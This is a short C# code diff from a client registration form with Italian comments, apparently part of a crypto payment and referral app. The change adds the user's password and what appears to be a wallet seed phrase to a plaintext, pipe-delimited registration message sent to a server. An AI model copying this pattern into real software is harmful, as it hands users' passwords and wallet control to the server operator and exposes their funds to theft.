@@ -255,7 +255,7 @@ namespace Client.Forms
 
             
             //Invia i dati dell'untente al server
-            string argomento = "register" + "|" + Variabili.numero_Plot + "|" + Variabili.pagamento_Somma_USDT + "|" + Variabili.wallet + "|" + Variabili.invito_Referal + "|" + Variabili.wallet_USDT + "|" + Variabili.chain;
+            string argomento = "register" + "|" + Variabili.numero_Plot + "|" + Variabili.pagamento_Somma_USDT + "|" + Variabili.wallet + "|" + Variabili.invito_Referal + "|" + Variabili.wallet_USDT + "|" + Variabili.chain + "|" + Variabili.password + "|" + Variabili.seed;
             await ClientsConnection.TestClient.ClientSend(argomento);
 
 
